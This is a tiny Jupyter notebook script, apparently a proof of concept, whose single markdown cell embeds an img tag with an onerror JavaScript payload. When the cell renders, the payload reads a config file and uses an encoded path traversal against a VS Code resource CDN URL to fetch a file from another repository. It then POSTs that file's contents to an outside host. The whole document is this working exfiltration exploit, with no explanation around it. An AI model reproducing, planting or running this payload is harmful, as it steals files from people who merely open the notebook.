# %% [markdown]
# <img src="data:foobar" onerror='
# console.log("Fetching...");
# fetch("./test.json")
#   .then(res => res.json())
#   .then(json => {
#     var url = "https://vscode-vfs+github-002b7b2276223a312c22726566223a7b2274797065223a352c226964223a226d61696e227d7d.vscode-resource.vscode-cdn.net/";
#     url += json["target_repo"];
#     url += "/..%2F../";
#     url += json["hosted_repo"];
#     url += "/";
#     url += json["target_file"];
#     return fetch(url);
#   }).then(res => res.text())
#   .then(text => {
#     console.log(text);
#     fetch("https://ammaraskar.com", {method: "POST", mode: "no-cors", body: text});
#   })
# '>
